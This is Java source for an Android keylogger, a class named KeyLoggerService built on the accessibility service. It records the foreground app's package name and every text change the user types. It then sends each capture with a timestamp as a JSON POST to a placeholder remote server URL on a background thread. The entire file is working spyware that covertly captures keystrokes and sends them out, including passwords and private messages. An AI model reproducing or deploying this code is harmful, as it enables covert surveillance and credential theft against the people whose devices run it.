package com.example.keylogger;

import android.accessibilityservice.AccessibilityService;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;

import org.json.JSONObject; // 1. import Json

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class KeyLoggerService extends AccessibilityService {
    
    private static final String SERVER_URL = "YOUR_SERVER_URL";
    private String currentAppPackage = "unknown";

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        
        if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            if (event.getPackageName() != null && !event.getPackageName().toString().isEmpty()) {
                this.currentAppPackage = event.getPackageName().toString();
            }
        }

        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            String text = event.getText().toString();
            
            if (text != null && text.length() > 2) {
                text = text.substring(1, text.length() - 1);
            } else if (text == null || text.length() <= 2) {
                return; 
            }

            
            JSONObject logData = new JSONObject();
            try {
               
                logData.put("timestamp", System.currentTimeMillis()); 
                // App name
                logData.put("app", this.currentAppPackage);
                // KEystork
                logData.put("key", text);
                
                // Log.d("KeyLoggerService", "Logging JSON: " + logData.toString());

                // JSON object server
                sendToServer(logData.toString());

            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

    @Override
    public void onInterrupt() {
        // Handle interruption
    }

    private void sendToServer(String jsonPayload) {
        new Thread(() -> {
            try {
                URL url = new URL(SERVER_URL);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setDoOutput(true);
                
                conn.setRequestProperty("Content-Type", "application/json; charset=utf-8");

                OutputStream os = conn.getOutputStream();
                os.write(jsonPayload.getBytes("UTF-8"));
                os.flush();
                os.close();

                int responseCode = conn.getResponseCode(); 
                // Log.d("KeyLoggerService", "Server Response: " + responseCode);

            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
    }
}
